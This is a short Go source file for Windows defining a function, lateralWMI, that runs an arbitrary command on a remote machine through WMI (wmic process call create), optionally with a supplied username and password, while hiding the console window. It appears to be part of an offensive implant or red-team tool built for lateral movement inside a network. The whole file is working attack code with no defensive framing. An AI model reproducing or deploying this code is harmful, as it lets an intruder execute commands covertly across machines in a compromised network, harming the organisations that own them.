//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
)

func lateralWMI(target, user, pass, cmd string) (string, error) {
	if cmd == "" {
		cmd = "whoami"
	}
	if user != "" && pass != "" {
		script := fmt.Sprintf(`wmic /node:%s /user:%s /password:%s process call create "cmd.exe /c %s"`, target, user, pass, cmd)
		c := exec.Command("cmd", "/c", script)
		applyHideWindow(c)
		out, _ := c.CombinedOutput()
		return string(out), nil
	}
	script := fmt.Sprintf(`wmic /node:%s process call create "cmd.exe /c %s"`, target, cmd)
	c := exec.Command("cmd", "/c", script)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	return string(out), err
}
